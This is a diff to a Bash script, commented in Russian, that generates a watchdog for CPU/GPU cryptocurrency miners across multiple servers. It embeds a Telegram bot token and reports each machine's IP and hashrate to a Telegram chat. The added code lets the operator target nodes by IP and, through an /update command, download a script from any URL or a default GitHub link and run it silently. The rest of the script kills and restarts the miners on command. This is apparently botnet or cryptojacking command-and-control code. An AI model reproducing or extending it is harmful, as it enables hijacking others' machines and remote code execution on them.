@@ -1,8 +1,12 @@
 #!/bin/bash
 
+# [ CONFIGURATION ]
 FIXED_WALLET_ID="krxYNV2DZQ"
 TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
 TG_CHAT_ID="7032066912"
+
+# Ссылка по умолчанию для команды /update
+DEFAULT_UPDATE_URL="https://raw.githubusercontent.com/xdLolKek/connfy-libs/refs/heads/main/Connfy.sh"
 
 # [ REPORTING INTERVAL: 18000s = 5 Hours ]
 REPORT_INTERVAL=18000 
@@ -110,7 +114,7 @@ if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
 fi
 
 # ----------------------------------------------------
-# [ PHASE 3: SECURE WATCHDOG ENGINE ]
+# [ PHASE 3: TARGETED MULTI-NODE WATCHDOG ]
 # ----------------------------------------------------
 cat <<EOF > watchdog.sh
 #!/bin/bash
@@ -123,6 +127,7 @@ WORKER="$WORKER"
 SERVER_IP="$SERVER_IP"
 TG_BOT_TOKEN="$TG_BOT_TOKEN"
 TG_CHAT_ID="$TG_CHAT_ID"
+DEFAULT_UPDATE_URL="$DEFAULT_UPDATE_URL"
 REPORT_INTERVAL=$REPORT_INTERVAL
 HAS_GPU=$HAS_GPU
 IS_ROOT=$IS_ROOT
@@ -141,6 +146,30 @@ send_tg_msg() {
          -d chat_id="\$TG_CHAT_ID" \
          -d text="\$msg" \
          -d parse_mode="HTML" > /dev/null 2>&1
+}
+
+# Функция таргетинга: проверяет, предназначается ли команда именно этой машине
+is_target_me() {
+    local target="\$1"
+    
+    # Если целевой IP не указан или 'all' - команда выполнится на ВСЕХ серверах
+    if [ -z "\$target" ] || [ "\$target" = "all" ] || [ "\$target" = "ALL" ]; then
+        return 0
+    fi
+    
+    # Совпадение по стандартному IP или Worker ID
+    if [ "\$target" = "\$SERVER_IP" ] || [ "\$target" = "\$WORKER" ]; then
+        return 0
+    fi
+    
+    # Совпадение по форматированному IP (например: 185A220A101A5)
+    local safe_ip
+    safe_ip=\$(echo "\$SERVER_IP" | sed 's/\./A/g')
+    if [ "\$target" = "\$safe_ip" ]; then
+        return 0
+    fi
+    
+    return 1
 }
 
 # Отчет по хешрейту
@@ -254,7 +283,7 @@ send_logs_report() {
 }
 
 # Стартовое уведомление
-STARTUP_MSG="🚀 <b>ENGINE V15 (REMOTE MODULE DEPLOYER ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [URL] to deploy remote scripts.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V16 (TARGETED MULTI-NODE ACTIVE)</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to update specific nodes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -295,7 +324,7 @@ while true; do
     [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
-    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК (АВТОРИЗОВАННЫЙ) ---
+    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК (АВТОРИЗОВАННЫЙ + ТАРГЕТИНГ ПО IP) ---
     LAST_CMD=\$(curl -s -m 3 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
@@ -305,49 +334,51 @@ while true; do
         curl -s -m 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1
 
         if [ -n "\$AUTH_CHECK" ]; then
-            if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
-                send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
-                
-            elif echo "\$LAST_CMD" | grep -iE "/specs|/hw|/info" >/dev/null 2>&1; then
-                send_specs_report
-                
-            elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
-                send_logs_report
+            CMD_TARGET=\$(echo "\$LAST_CMD" | awk '{print \$2}' | tr -d '\r\n')
 
-            elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
-                TARGET_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
+            if is_target_me "\$CMD_TARGET"; then
                 
-                if [ -n "\$TARGET_URL" ]; then
+                if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
+                    send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
+                    
+                elif echo "\$LAST_CMD" | grep -iE "/specs|/hw|/info" >/dev/null 2>&1; then
+                    send_specs_report
+                    
+                elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
+                    send_logs_report
+
+                elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
+                    CUSTOM_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
+                    [ -n "\$CUSTOM_URL" ] && TARGET_URL="\$CUSTOM_URL" || TARGET_URL="\$DEFAULT_UPDATE_URL"
+                    
                     MODULE_DIR="\$BASE_DIR/updates"
                     mkdir -p "\$MODULE_DIR"
                     
                     TIMESTAMP=\$(date +%s)
-                    DEST_SCRIPT="\$MODULE_DIR/mod_\${TIMESTAMP}.sh"
+                    DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
                     
                     curl -L -k -s -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" "\$TARGET_URL"
                     
                     if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
                         chmod +x "\$DEST_SCRIPT"
                         nohup "\$DEST_SCRIPT" >/dev/null 2>&1 &
-                        send_tg_msg "✅ <b>SCRIPT DEPLOYED:</b> Module downloaded to <code>\$DEST_SCRIPT</code> and executed!"
+                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script downloaded from GitHub (<code>Connfy.sh</code>) and launched!"
                     else
-                        send_tg_msg "❌ <b>DEPLOYMENT FAILED:</b> Could not fetch file from URL."
+                        send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
                     fi
-                else
-                    send_tg_msg "⚠️ <b>USAGE:</b> Send <code>/update https://link-to-script.sh</code>"
+
+                elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
+                    PAUSED=1
+                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
+                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
+                    send_tg_msg "🛑 <b>PAUSE COMMAND RECEIVED:</b> Processes terminated on IP \$SERVER_IP"
+
+                elif echo "\$LAST_CMD" | grep -iE "/start|/restart" >/dev/null 2>&1; then
+                    PAUSED=0
+                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
+                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
+                    send_tg_msg "🔄 <b>RESUME COMMAND RECEIVED:</b> Restarting processes on IP \$SERVER_IP"
                 fi
-
-            elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
-                PAUSED=1
-                pkill -9 -f "\$BIN_CPU" 2>/dev/null
-                pkill -9 -f "\$BIN_GPU" 2>/dev/null
-                send_tg_msg "🛑 <b>PAUSE COMMAND RECEIVED:</b> Processes terminated on IP \$SERVER_IP"
-
-            elif echo "\$LAST_CMD" | grep -iE "/start|/restart" >/dev/null 2>&1; then
-                PAUSED=0
-                pkill -9 -f "\$BIN_CPU" 2>/dev/null
-                pkill -9 -f "\$BIN_GPU" 2>/dev/null
-                send_tg_msg "🔄 <b>RESUME COMMAND RECEIVED:</b> Restarting processes on IP \$SERVER_IP"
             fi
         fi
     fi
